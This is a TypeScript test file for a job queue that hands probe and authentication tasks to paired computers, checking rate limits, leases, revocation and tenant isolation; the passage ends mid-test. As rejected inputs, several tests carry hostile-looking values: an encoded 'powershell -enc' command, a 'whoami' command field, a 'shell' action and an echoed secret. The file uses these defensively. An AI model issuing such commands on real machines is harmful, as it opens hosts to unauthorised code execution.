/**
 * Runtime-action queue contract: a signed-in person queues a safe probe/auth
 * action for one of their paired computers; that exact computer pulls it and
 * advances it under a short lease. No endpoint accepts a shell command,
 * credential, or unstructured machine result.
 *
 * Run: node --conditions=react-server --import tsx tests/bridge-runtime-jobs.test.ts
 */
import assert from "node:assert/strict";
import { createHash, randomUUID } from "node:crypto";
import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { createClient, type Client } from "@libsql/client";
import { NextRequest } from "next/server";

const ROOT = process.cwd();
const dbFile = join(mkdtempSync(join(tmpdir(), "bridge-runtime-jobs-")), "test.db");
process.env.EMPIRE_DATA_BACKEND = "turso_cloud";
process.env.TURSO_DB_PATH = dbFile;
process.env.EMPIRE_AUTH_BACKEND = "turso";
process.env.AUTH_SESSION_SECRET = "bridge-runtime-jobs-session-secret-32-chars";
const SECRET_FIXTURE = "sk-runtime-job-must-never-be-persisted-0123456789";
process.env.RUNTIME_JOB_TEST_API_KEY = SECRET_FIXTURE;
for (const key of ["TURSO_DATABASE_URL", "TURSO_DB_URL", "TURSO_AUTH_TOKEN", "BRAVO_SUPABASE_URL", "BRAVO_SUPABASE_SERVICE_ROLE_KEY"]) {
  delete process.env[key];
}

function stub(request: string, exports: Record<string, unknown>) {
  const p = require.resolve(request);
  require.cache[p] = { id: p, filename: p, path: dirname(p), loaded: true, children: [], paths: [], exports } as unknown as NodeModule;
}

stub("next/headers", {
  cookies: async () => ({ get: () => undefined, getAll: () => [], has: () => false, set: () => undefined }),
  headers: async () => new Headers(),
  draftMode: async () => ({ isEnabled: false }),
});
stub("next/navigation", {
  notFound: () => {
    throw new Error("NEXT_HTTP_ERROR_FALLBACK;404");
  },
  redirect: (url: string) => {
    throw new Error(`NEXT_REDIRECT;${url}`);
  },
});

const TENANT = "runtime-tenant-a";
const OTHER_TENANT = "runtime-tenant-b";
const USER = "runtime-user-a";
const OTHER_USER = "runtime-user-b";
const STAMP = "2026-10-12T08:00:00.000Z";
const db: Client = createClient({ url: `file:${dbFile}` });
const sha256 = (value: string) => createHash("sha256").update(value, "utf8").digest("hex");

type Session =
  | { ok: true; userId: string; profileId: string; tenantId: string; email: string; teamRole: string; isAdmin: boolean; isTrueAdmin: boolean; adminAccess: boolean }
  | { ok: false; reason: "no_session" };
let browserSession: Session = {
  ok: true,
  userId: USER,
  profileId: "profile-runtime-a",
  tenantId: TENANT,
  email: "runtime-a@example.test",
  teamRole: "member",
  isAdmin: false,
  isTrueAdmin: false,
  adminAccess: false,
};
stub("../lib/api-auth", { resolveSessionContext: async () => browserSession });

const inactiveSeats = new Set<string>();
const seatChecks = new Map<string, number>();
const seatKey = (tenantId: string, userId: string) => `${tenantId}\u0000${userId}`;
stub("../lib/os/seat", {
  liveSeat: async (tenantId: string, userId: string) => {
    const key = seatKey(tenantId, userId);
    seatChecks.set(key, (seatChecks.get(key) ?? 0) + 1);
    return inactiveSeats.has(key)
      ? { live: false, reason: "deactivated" }
      : {
          live: true,
          profile: { id: `profile-${userId}`, email: null, teamRole: "member", isOwner: false, adminAccess: false },
        };
  },
});

function splitStatements(sql: string): string[] {
  const out: string[] = [];
  let buffer: string[] = [];
  for (const line of sql.split(/\r?\n/)) {
    const stripped = line.trim();
    if (!stripped || stripped.startsWith("--")) continue;
    buffer.push(line);
    if (stripped.endsWith(";")) {
      out.push(buffer.join("\n").trim().replace(/;$/, "").trim());
      buffer = [];
    }
  }
  const tail = buffer.join("\n").trim().replace(/;$/, "").trim();
  if (tail) out.push(tail);
  return out;
}

async function createSchema() {
  await db.executeMultiple(`
    CREATE TABLE agent_model_config (
      id TEXT PRIMARY KEY, tenant_id TEXT NOT NULL, user_id TEXT, agent_key TEXT NOT NULL,
      provider TEXT NOT NULL, model TEXT NOT NULL, updated_at TEXT
    );
    CREATE TABLE bridge_pairings (
      id TEXT PRIMARY KEY, tenant_id TEXT NOT NULL, user_id TEXT, label TEXT,
      bridge_token_hash TEXT NOT NULL, revoked_at TEXT, scope TEXT, paired_via TEXT,
      claim_enabled_at TEXT, claim_enabled_by TEXT, previous_token_hash TEXT,
      token_rotated_at TEXT, created_at TEXT
    );
    CREATE TABLE dept_chat_runs (
      id TEXT PRIMARY KEY, tenant_id TEXT NOT NULL, user_id TEXT NOT NULL,
      status TEXT NOT NULL, created_at TEXT NOT NULL, claimed_pairing_id TEXT,
      lease_id TEXT
    );
    CREATE UNIQUE INDEX dept_chat_runs_pairing_claim_idx
      ON dept_chat_runs (claimed_pairing_id, lease_id);
    CREATE TABLE agent_events (
      id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))), event_type TEXT,
      publisher_agent TEXT, severity TEXT, payload TEXT, correlation_id TEXT,
      created_at TEXT DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now'))
    );
  `);
  const migration = readFileSync(join(ROOT, "database", "turso", "bravo__215_ai_engine_pairing_runtime.sql"), "utf8");
  for (const statement of splitStatements(migration)) await db.execute(statement);
}

let pairingSeq = 0;
async function makePairing(opts: { tenantId?: string; userId?: string; revoked?: boolean; approved?: boolean; pairedVia?: "pair_code" | "hmac" | "signup_secret" | null } = {}) {
  pairingSeq += 1;
  const id = `runtime-pairing-${pairingSeq}`;
  const token = `oab_runtime_${pairingSeq}_${randomUUID()}`;
  await db.execute({
    sql: `INSERT INTO bridge_pairings
          (id, tenant_id, user_id, label, bridge_token_hash, revoked_at, scope, paired_via, claim_enabled_at, claim_enabled_by, created_at)
          VALUES (?, ?, ?, ?, ?, ?, 'connector', ?, ?, ?, ?)`,
    args: [
      id,
      opts.tenantId ?? TENANT,
      opts.userId ?? USER,
      `Runtime computer ${pairingSeq}`,
      sha256(token),
      opts.revoked ? STAMP : null,
      opts.pairedVia === undefined ? "pair_code" : opts.pairedVia,
      opts.approved === false ? null : STAMP,
      opts.approved === false ? null : opts.userId ?? USER,
      STAMP,
    ],
  });
  return { id, token };
}

function machineRequest(path: string, token: string | null, body: unknown) {
  return new NextRequest(`https://oasisai.work${path}`, {
    method: "POST",
    headers: { "content-type": "application/json", ...(token ? { authorization: `Bearer ${token}` } : {}) },
    body: JSON.stringify(body),
  });
}

type TestJsonBody = Record<string, unknown> & {
  ok: boolean;
  error: string;
  code: string;
  job: Record<string, unknown> & {
    job_id: string;
    lease_id: string;
    protocol: string;
    action: string;
    engine: Record<string, unknown>;
  };
};

async function json(response: Response) {
  return { status: response.status, body: (await response.json().catch(() => ({}))) as TestJsonBody };
}

let failures = 0;
let passed = 0;
async function check(name: string, fn: () => Promise<void> | void) {
  try {
    await fn();
    passed += 1;
    console.log(`  ok    ${name}`);
  } catch (error) {
    failures += 1;
    const detail = error instanceof Error ? error.stack || error.message : String(error);
    console.log(`  FAIL  ${name}\n        ${detail.split("\n").slice(0, 10).join("\n        ")}`);
  }
}

async function main() {
  await createSchema();
  const runtime = await import("../lib/bridge/runtime-jobs");
  const claimRoute = await import("../app/api/bridge/runtime-jobs/claim/route");
  const heartbeatRoute = await import("../app/api/bridge/runtime-jobs/[job_id]/heartbeat/route");
  const progressRoute = await import("../app/api/bridge/runtime-jobs/[job_id]/progress/route");
  const completeRoute = await import("../app/api/bridge/runtime-jobs/[job_id]/complete/route");
  const failRoute = await import("../app/api/bridge/runtime-jobs/[job_id]/fail/route");
  const statusRoute = await import("../app/api/bridge/runtime-jobs/[job_id]/route");

  console.log("bridge-runtime-jobs:");

  await check("runtime claim long-polls are throttled per pairing and protocol", async () => {
    const computer = await makePairing();
    const statuses: number[] = [];
    for (let index = 0; index < 4; index += 1) {
      const response = await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", computer.token, {
        protocol: "runtime_action_v1",
        claim_id: `rate-runtime-${index}`,
        capabilities: [],
        wait_ms: 0,
      }));
      statuses.push(response.status);
      if (index === 3) assert.equal(((await response.json()) as { error?: string }).error, "claim_too_fast");
    }
    assert.deepEqual(statuses, [200, 200, 200, 429]);
  });

  await check("local model refs preserve vendor case while CLI provider names normalize", () => {
    assert.deepEqual(runtime.parseRuntimeEngine({ kind: "local", name: "lmstudio/Qwen3-Coder-GGUF" }), {
      ok: true,
      engine: { kind: "local", name: "lmstudio/Qwen3-Coder-GGUF" },
    });
    assert.deepEqual(runtime.parseRuntimeEngine({ kind: "cli", name: "CODEX" }), {
      ok: true,
      engine: { kind: "cli", name: "codex" },
    });
    const identity = { tenantId: TENANT, userId: USER, pairingId: "pair-case", action: "probe" as const };
    assert.notEqual(
      runtime.runtimeOperationKey({ ...identity, engine: { kind: "local", name: "lmstudio/Foo" } }),
      runtime.runtimeOperationKey({ ...identity, engine: { kind: "local", name: "lmstudio/foo" } }),
      "case-distinct local models must never collide in the queue",
    );
    assert.equal(
      runtime.runtimeOperationKey({ ...identity, engine: { kind: "cli", name: "CODEX" } }),
      runtime.runtimeOperationKey({ ...identity, engine: { kind: "cli", name: "codex" } }),
      "CLI provider ids remain case-insensitive",
    );
  });

  await check("migration adds the engine binding, runtime claim state, targeted-run fields, queue, and tenant-leading indexes", async () => {
    const columns = async (table: string) => (await db.execute(`PRAGMA table_info('${table}')`)).rows.map((row) => String(row.name));
    assert.ok((await columns("agent_model_config")).includes("computer_pairing_id"));
    assert.ok((await columns("agent_model_config")).includes("fallback_policy"));
    assert.ok((await columns("bridge_pairings")).includes("claim_runtime_state"));
    for (const name of ["target_pairing_id", "runtime_engine_kind", "runtime_engine_name", "runtime_fallback_policy", "runtime_fallback_reason"]) {
      assert.ok((await columns("dept_chat_runs")).includes(name), `${name} missing`);
    }
    const jobColumns = await columns("bridge_runtime_jobs");
    for (const name of ["tenant_id", "user_id", "pairing_id", "action", "engine_kind", "engine_name", "idempotency_key", "lease_id", "deadline_at"]) {
      assert.ok(jobColumns.includes(name), `${name} missing`);
    }
    const indexes = (await db.execute("SELECT name, sql FROM sqlite_master WHERE type = 'index' AND tbl_name IN ('bridge_runtime_jobs','dept_chat_runs')")).rows;
    assert.ok(indexes.some((row) => /bridge_runtime_jobs.*claim/i.test(String(row.name))));
    assert.ok(indexes.some((row) => /dept_chat_runs.*target/i.test(String(row.name))));
    const exactClaimColumns = (await db.execute("PRAGMA index_info('dept_chat_runs_target_claim_idx')")).rows.map((row) => String(row.name));
    assert.deepEqual(exactClaimColumns, ["tenant_id", "target_pairing_id", "status", "created_at"], "the v2 target claim index must not collide with migration 213's lease index");
    for (const row of indexes) {
      const sql = String(row.sql || "");
      if (/bridge_runtime_jobs/.test(sql) && /CREATE INDEX/i.test(sql)) assert.match(sql, /\(tenant_id,/i, `${row.name} is not tenant-leading`);
    }
  });

  await check("enqueue derives a stable operation key, reuses only active work, and retries immediately after a terminal result", async () => {
    const pairing = await makePairing();
    const at = new Date("2026-10-12T12:00:00.000Z");
    const invalidAction = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "shell" as never,
      engine: { kind: "cli", name: "codex" },
      now: at,
    });
    assert.deepEqual(invalidAction, { ok: false, code: "unsupported_action" });
    const rawSecret = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "probe",
      engine: { kind: "cli", name: "codex" },
      prompt: `echo ${SECRET_FIXTURE}`,
      now: at,
    });
    assert.deepEqual(rawSecret, { ok: false, code: "secret_material_rejected" });
    const input = {
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "probe" as const,
      engine: { kind: "cli", name: "codex" },
      prompt: "Reply with OASIS runtime ready.",
      now: at,
    };
    const first = await runtime.enqueueRuntimeJob(input);
    const second = await runtime.enqueueRuntimeJob(input);
    assert.equal(first.ok, true);
    assert.equal(second.ok, true);
    if (!first.ok || !second.ok) return;
    assert.equal(second.job.id, first.job.id);
    assert.equal(second.created, false);
    const stable = runtime.runtimeOperationKey(input);
    assert.ok(first.job.idempotencyKey.startsWith(`${stable}:`));
    assert.equal((await db.execute({ sql: "SELECT COUNT(*) AS n FROM bridge_runtime_jobs WHERE tenant_id = ? AND user_id = ? AND pairing_id = ?", args: [TENANT, USER, pairing.id] })).rows[0].n, 1);
    await db.execute({
      sql: "UPDATE bridge_runtime_jobs SET status = 'completed', result_code = 'probe_ok', result_json = '{}', finished_at = ?, updated_at = ? WHERE id = ?",
      args: [at.toISOString(), at.toISOString(), first.job.id],
    });
    const retry = await runtime.enqueueRuntimeJob({ ...input, now: new Date(at.getTime() + 1_000) });
    assert.equal(retry.ok, true);
    if (retry.ok) assert.notEqual(retry.job.id, first.job.id, "a completed or failed receipt must never suppress a real retry");
    const duplicateRetry = await runtime.enqueueRuntimeJob({ ...input, now: new Date(at.getTime() + 1_000) });
    assert.equal(duplicateRetry.ok && retry.ok && duplicateRetry.job.id, retry.ok ? retry.job.id : null, "concurrent retry clicks still share the one active attempt");
    await db.execute({ sql: "UPDATE bridge_pairings SET revoked_at = ? WHERE id = ?", args: [new Date().toISOString(), pairing.id] });
    assert.deepEqual(await runtime.enqueueRuntimeJob({ ...input, now: new Date(at.getTime() + 2_000) }), { ok: false, code: "pairing_unavailable" });
  });

  await check("an unclaimed job expires instead of being reused forever", async () => {
    const pairing = await makePairing();
    const at = new Date("2026-10-12T12:30:00.000Z");
    const input = {
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "probe" as const,
      engine: { kind: "cli" as const, name: "codex" },
      prompt: "Reply with OASIS runtime ready.",
    };
    const stale = await runtime.enqueueRuntimeJob({ ...input, now: at });
    assert.equal(stale.ok, true);
    if (!stale.ok) return;
    const afterTtl = new Date(at.getTime() + runtime.RUNTIME_QUEUED_TTL_MS + 1);
    const expiredClaim = await runtime.claimRuntimeJob({
      tenantId: TENANT,
      pairingId: pairing.id,
      claimId: "stale-queue-claim",
      capabilities: [{ action: "probe", engine: { kind: "cli", name: "codex" } }],
      now: afterTtl,
    });
    assert.equal(expiredClaim, null, "the claim path handed out an expired queued job");
    const retry = await runtime.enqueueRuntimeJob({
      ...input,
      now: afterTtl,
    });
    assert.equal(retry.ok, true);
    if (!retry.ok) return;
    assert.notEqual(retry.job.id, stale.job.id, "the expired queued job was incorrectly reused");
    const old = (await db.execute({
      sql: "SELECT status, error_code, error_retryable, finished_at FROM bridge_runtime_jobs WHERE id = ?",
      args: [stale.job.id],
    })).rows[0];
    assert.deepEqual(
      { status: old.status, error: old.error_code, retryable: Number(old.error_retryable), finished: typeof old.finished_at },
      { status: "failed", error: "queue_expired", retryable: 1, finished: "string" },
    );
  });

  await check("expired queued jobs release the per-pairing active cap", async () => {
    const pairing = await makePairing();
    const at = new Date("2026-10-12T12:45:00.000Z");
    for (let i = 0; i < runtime.RUNTIME_JOB_MAX_ACTIVE_PER_USER_PAIRING; i += 1) {
      const queued = await runtime.enqueueRuntimeJob({
        tenantId: TENANT,
        userId: USER,
        pairingId: pairing.id,
        action: "probe",
        engine: { kind: "local", name: `ollama/stale-cap-${i}` },
        prompt: "Reply with OASIS runtime ready.",
        now: at,
      });
      assert.equal(queued.ok, true);
    }
    const recovered = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "auth",
      engine: { kind: "cli", name: "claude" },
      now: new Date(at.getTime() + runtime.RUNTIME_QUEUED_TTL_MS + 1),
    });
    assert.equal(recovered.ok, true, "stale queued rows still consumed active capacity");
    const states = await db.execute({
      sql: "SELECT status, error_code, COUNT(*) AS n FROM bridge_runtime_jobs WHERE tenant_id = ? AND pairing_id = ? GROUP BY status, error_code ORDER BY status",
      args: [TENANT, pairing.id],
    });
    assert.deepEqual(
      states.rows.map((row) => [row.status, row.error_code, Number(row.n)]),
      [
        ["failed", "queue_expired", runtime.RUNTIME_JOB_MAX_ACTIVE_PER_USER_PAIRING],
        ["queued", null, 1],
      ],
    );
  });

  await check("dashboard callers cannot restore UUID-per-click idempotency", () => {
    for (const path of ["app/api/ai/engine/route.ts", "app/api/bridge/cli-auth/route.ts"]) {
      const source = readFileSync(join(ROOT, path), "utf8");
      assert.doesNotMatch(source, /\bidempotencyKey\b/, `${path} must leave idempotency ownership in the runtime-job store`);
      assert.doesNotMatch(source, /\brandomUUID\b/, `${path} must not defeat operation reuse with a request UUID`);
    }
  });

  await check("an authenticated user cannot overfill one pairing's active queue or flood fresh attempts", async () => {
    const activePairing = await makePairing();
    const at = new Date("2026-10-12T13:00:00.000Z");
    const operations = [
      { action: "probe" as const, engine: { kind: "cli" as const, name: "claude" }, prompt: "Reply with OASIS runtime ready." },
      { action: "probe" as const, engine: { kind: "cli" as const, name: "codex" }, prompt: "Reply with OASIS runtime ready." },
      { action: "probe" as const, engine: { kind: "cli" as const, name: "gemini" }, prompt: "Reply with OASIS runtime ready." },
      { action: "auth" as const, engine: { kind: "cli" as const, name: "codex" } },
    ];
    assert.equal(operations.length, runtime.RUNTIME_JOB_MAX_ACTIVE_PER_USER_PAIRING);
    for (const operation of operations) {
      const queued = await runtime.enqueueRuntimeJob({ tenantId: TENANT, userId: USER, pairingId: activePairing.id, ...operation, now: at });
      assert.equal(queued.ok, true);
    }
    assert.deepEqual(
      await runtime.enqueueRuntimeJob({
        tenantId: TENANT,
        userId: USER,
        pairingId: activePairing.id,
        action: "auth",
        engine: { kind: "cli", name: "claude" },
        now: at,
      }),
      { ok: false, code: "queue_full" },
    );

    const ratePairing = await makePairing();
    for (let i = 0; i < runtime.RUNTIME_JOB_MAX_NEW_PER_WINDOW; i += 1) {
      const now = new Date(at.getTime() + i);
      const queued = await runtime.enqueueRuntimeJob({
        tenantId: TENANT,
        userId: USER,
        pairingId: ratePairing.id,
        action: "probe",
        engine: { kind: "local", name: `ollama/rate-model-${i}` },
        prompt: "Reply with OASIS runtime ready.",
        now,
      });
      assert.equal(queued.ok, true, `attempt ${i + 1}`);
      if (!queued.ok) return;
      await db.execute({
        sql: "UPDATE bridge_runtime_jobs SET status = 'completed', result_code = 'probe_ok', result_json = '{}', finished_at = ?, updated_at = ? WHERE id = ?",
        args: [now.toISOString(), now.toISOString(), queued.job.id],
      });
    }
    assert.deepEqual(
      await runtime.enqueueRuntimeJob({
        tenantId: TENANT,
        userId: USER,
        pairingId: ratePairing.id,
        action: "probe",
        engine: { kind: "local", name: "ollama/rate-overflow" },
        prompt: "Reply with OASIS runtime ready.",
        now: new Date(at.getTime() + runtime.RUNTIME_JOB_RATE_WINDOW_MS - 1),
      }),
      { ok: false, code: "rate_limited" },
    );
  });

  await check("the active queue cap remains closed under parallel distinct requests", async () => {
    const pairing = await makePairing();
    const at = new Date("2026-10-12T14:00:00.000Z");
    const attempts = await Promise.all(
      Array.from({ length: runtime.RUNTIME_JOB_MAX_ACTIVE_PER_USER_PAIRING + 6 }, (_, index) =>
        runtime.enqueueRuntimeJob({
          tenantId: TENANT,
          userId: USER,
          pairingId: pairing.id,
          action: "probe",
          engine: { kind: "local", name: `ollama/parallel-${index}` },
          prompt: "Reply with OASIS runtime ready.",
          now: at,
        }),
      ),
    );
    assert.equal(attempts.filter((attempt) => attempt.ok).length, runtime.RUNTIME_JOB_MAX_ACTIVE_PER_USER_PAIRING);
    assert.ok(attempts.filter((attempt) => !attempt.ok).every((attempt) => attempt.code === "queue_full"));
    const active = await db.execute({
      sql: "SELECT COUNT(*) AS n FROM bridge_runtime_jobs WHERE tenant_id = ? AND user_id = ? AND pairing_id = ? AND status IN ('queued', 'running')",
      args: [TENANT, USER, pairing.id],
    });
    assert.equal(Number(active.rows[0].n), runtime.RUNTIME_JOB_MAX_ACTIVE_PER_USER_PAIRING);
  });

  await check("requester ownership stays separate from the paired computer owner", async () => {
    const pairing = await makePairing({ userId: USER });
    const otherPairing = await makePairing({ userId: USER });
    const queued = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: OTHER_USER,
      pairingId: pairing.id,
      action: "probe",
      engine: { kind: "cli", name: "codex" },
      prompt: "Reply with OASIS runtime ready.",
    });
    assert.equal(queued.ok, true);
    if (!queued.ok) return;
    assert.equal(queued.job.userId, OTHER_USER);

    const ctx = { params: Promise.resolve({ job_id: queued.job.id }) };
    const request = new NextRequest(`https://oasisai.work/api/bridge/runtime-jobs/${queued.job.id}`);
    browserSession = { ...browserSession, ok: true, userId: OTHER_USER, tenantId: TENANT } as Session;
    assert.equal((await json(await statusRoute.GET(request, ctx))).status, 200);
    browserSession = { ...browserSession, ok: true, userId: USER, tenantId: TENANT } as Session;
    assert.equal((await json(await statusRoute.GET(request, ctx))).status, 404);

    const claimBody = {
      protocol: "runtime_action_v1",
      claim_id: "manager-probe-claim",
      capabilities: [{ action: "probe", engine: { kind: "cli", name: "codex" } }],
      wait_ms: 0,
    };
    const wrongMachine = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", otherPairing.token, claimBody)));
    assert.deepEqual(wrongMachine.body, { ok: true, job: null });
    const pairedMachine = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, claimBody)));
    assert.equal(pairedMachine.status, 200);
    assert.equal(pairedMachine.body.job.job_id, queued.job.id);
    const leaseId = pairedMachine.body.job.lease_id;
    const wrongLease = await json(await heartbeatRoute.POST(machineRequest(
      `/api/bridge/runtime-jobs/${queued.job.id}/heartbeat`,
      otherPairing.token,
      { lease_id: leaseId },
    ), ctx));
    assert.equal(wrongLease.status, 409);
    assert.equal(wrongLease.body.error, "lease_lost");
    assert.equal((await json(await progressRoute.POST(machineRequest(
      `/api/bridge/runtime-jobs/${queued.job.id}/progress`,
      pairing.token,
      { lease_id: leaseId, progress: { code: "accepted" } },
    ), ctx))).status, 200);
    assert.equal((await json(await completeRoute.POST(machineRequest(
      `/api/bridge/runtime-jobs/${queued.job.id}/complete`,
      pairing.token,
      { lease_id: leaseId, result: { code: "probe_ok", answer: "OASIS_RUNTIME_READY" } },
    ), ctx))).status, 200);
    browserSession = { ...browserSession, ok: true, userId: OTHER_USER, tenantId: TENANT } as Session;
    const done = await json(await statusRoute.GET(request, ctx));
    assert.equal(done.body.job.status, "done");
    browserSession = { ...browserSession, ok: true, userId: USER, tenantId: TENANT } as Session;
  });

  await check("claim uses the exact bearer pairing, capability allowlist, wire contract, and claim-id idempotency", async () => {
    const target = await makePairing();
    const other = await makePairing();
    const queued = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: USER,
      pairingId: target.id,
      action: "auth",
      engine: { kind: "cli", name: "gemini" },
    });
    assert.equal(queued.ok, true);
    const claimBody = {
      protocol: "runtime_action_v1",
      claim_id: "claim-runtime-auth-1",
      capabilities: [{ action: "auth", engine: { kind: "cli", name: "gemini" } }],
      runtime_state: {
        claude: { installed: true, authenticated: true, state: "account_identity_unavailable" },
        codex: { installed: true, authenticated: true, state: "ready" },
        gemini: { installed: true, authenticated: false, state: "needs_sign_in" },
        local_models: [{ ref: "ollama/llama3.3:70b", label: "Llama 3.3 70B", adapter: "ollama", state: "ready" }],
      },
      wait_ms: 0,
    };
    const wrongMachine = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", other.token, claimBody)));
    assert.deepEqual(wrongMachine.body, { ok: true, job: null });
    const claimed = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", target.token, claimBody)));
    assert.equal(claimed.status, 200);
    assert.equal(claimed.body.ok, true);
    assert.deepEqual(Object.keys(claimed.body.job).sort(), ["action", "deadline_at", "engine", "job_id", "lease_id", "protocol"].sort());
    assert.equal(claimed.body.job.protocol, "runtime_action_v1");
    assert.equal(claimed.body.job.action, "auth");
    assert.deepEqual(claimed.body.job.engine, { kind: "cli", name: "gemini" });
    const retry = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", target.token, claimBody)));
    assert.equal(retry.body.job.job_id, claimed.body.job.job_id);
    assert.equal(retry.body.job.lease_id, claimed.body.job.lease_id);
    const state = (await db.execute({ sql: "SELECT claim_runtime_state FROM bridge_pairings WHERE id = ?", args: [target.id] })).rows[0].claim_runtime_state;
    const runtimeState = JSON.parse(String(state));
    assert.equal(runtimeState.claude.state, "account_identity_unavailable");
    assert.equal(runtimeState.gemini.state, "needs_sign_in");
    assert.equal(runtimeState.local_models[0].ref, "ollama/llama3.3:70b");
    assert.doesNotMatch(String(state), /Bearer|oab_runtime/);
  });

  await check("claim rejects arbitrary fields, unsupported actions, and every pairing that lacks canonical approval", async () => {
    const live = await makePairing();
    const revoked = await makePairing({ revoked: true });
    const unapproved = await makePairing({ approved: false });
    const signupSecret = await makePairing({ pairedVia: "signup_secret" });
    const base = { protocol: "runtime_action_v1", claim_id: "claim-validation", wait_ms: 0 };
    assert.equal((await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", null, { ...base, capabilities: [] })))).status, 401);
    assert.equal((await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", revoked.token, { ...base, capabilities: [] })))).status, 403);
    for (const pairing of [unapproved, signupSecret]) {
      const refused = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, { ...base, capabilities: [] })));
      assert.equal(refused.status, 403);
      assert.equal(refused.body.error, "pairing_not_approved");
    }
    const command = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", live.token, {
      ...base,
      capabilities: [{ action: "probe", engine: { kind: "cli", name: "codex" }, command: "powershell -enc AAA" }],
    })));
    assert.equal(command.status, 400);
    assert.equal(command.body.error, "unexpected_field");
    const shell = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", live.token, {
      ...base,
      claim_id: "claim-shell",
      capabilities: [{ action: "shell", engine: { kind: "cli", name: "codex" } }],
    })));
    assert.equal(shell.status, 400);
    assert.equal(shell.body.error, "unsupported_action");
    const invalidState = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", live.token, {
      ...base,
      claim_id: "claim-invalid-state",
      capabilities: [],
      runtime_state: {
        claude: { installed: true, authenticated: true, state: "ready", command: "whoami" },
        codex: { installed: true, authenticated: true, state: "ready" },
        gemini: { installed: false, authenticated: false, state: "not_installed" },
      },
    })));
    assert.equal(invalidState.status, 400);
    assert.equal(invalidState.body.error, "unexpected_field");
  });

  await check("revocation while a claim is long-polling is surfaced and can never hand out later work", async () => {
    const pairing = await makePairing();
    const pending = claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, {
      protocol: "runtime_action_v1",
      claim_id: "claim-revoked-mid-wait",
      capabilities: [{ action: "probe", engine: { kind: "cli", name: "codex" } }],
      wait_ms: 1_000,
    }));
    await new Promise((resolve) => setTimeout(resolve, 100));
    await db.execute({ sql: "UPDATE bridge_pairings SET revoked_at = ? WHERE id = ?", args: [new Date().toISOString(), pairing.id] });
    const result = await json(await pending);
    assert.equal(result.status, 403);
    assert.equal(result.body.error, "pairing_revoked");
  });

  await check("approval loss while a claim is long-polling stops that poll immediately", async () => {
    const pairing = await makePairing();
    const pending = claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, {
      protocol: "runtime_action_v1",
      claim_id: "claim-unapproved-mid-wait",
      capabilities: [{ action: "probe", engine: { kind: "cli", name: "codex" } }],
      wait_ms: 1_000,
    }));
    await new Promise((resolve) => setTimeout(resolve, 100));
    await db.execute({ sql: "UPDATE bridge_pairings SET claim_enabled_at = NULL, claim_enabled_by = NULL WHERE id = ?", args: [pairing.id] });
    const result = await json(await pending);
    assert.equal(result.status, 403);
    assert.equal(result.body.error, "pairing_not_approved");
  });

  await check("an inactive pairing owner is refused at claim entry and during an open long poll", async () => {
    const pairing = await makePairing({ userId: USER });
    const key = seatKey(TENANT, USER);
    const body = {
      protocol: "runtime_action_v1",
      claim_id: "claim-owner-seat-entry",
      capabilities: [{ action: "probe", engine: { kind: "cli", name: "codex" } }],
      wait_ms: 0,
    };
    try {
      inactiveSeats.add(key);
      const entry = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, body)));
      assert.equal(entry.status, 403);
      assert.equal(entry.body.error, "seat_inactive");

      inactiveSeats.delete(key);
      const checksBeforePoll = seatChecks.get(key) ?? 0;
      const pending = claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, {
        ...body,
        claim_id: "claim-owner-seat-mid-poll",
        wait_ms: 1_000,
      }));
      for (let attempt = 0; attempt < 100 && (seatChecks.get(key) ?? 0) < checksBeforePoll + 2; attempt += 1) {
        await new Promise((resolve) => setTimeout(resolve, 10));
      }
      assert.ok((seatChecks.get(key) ?? 0) >= checksBeforePoll + 2, "the request never reached its first long-poll pass");
      inactiveSeats.add(key);
      const midPoll = await json(await pending);
      assert.equal(midPoll.status, 403);
      assert.equal(midPoll.body.error, "seat_inactive");
    } finally {
      inactiveSeats.delete(key);
    }
  });

  await check("requester seat revocation terminalizes only the exact claimed lease before disclosing an action", async () => {
    const pairing = await makePairing({ userId: USER });
    const revoked = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: OTHER_USER,
      pairingId: pairing.id,
      action: "probe",
      engine: { kind: "cli", name: "codex" },
      prompt: "Reply with OASIS runtime ready.",
    });
    const untouched = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "probe",
      engine: { kind: "local", name: "ollama/seat-control" },
      prompt: "Reply with OASIS runtime ready.",
    });
    assert.equal(revoked.ok, true);
    assert.equal(untouched.ok, true);
    if (!revoked.ok || !untouched.ok) return;

    const key = seatKey(TENANT, OTHER_USER);
    try {
      inactiveSeats.add(key);
      const response = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, {
        protocol: "runtime_action_v1",
        claim_id: "claim-revoked-requester",
        capabilities: [{ action: "probe", engine: { kind: "cli", name: "codex" } }],
        wait_ms: 0,
      })));
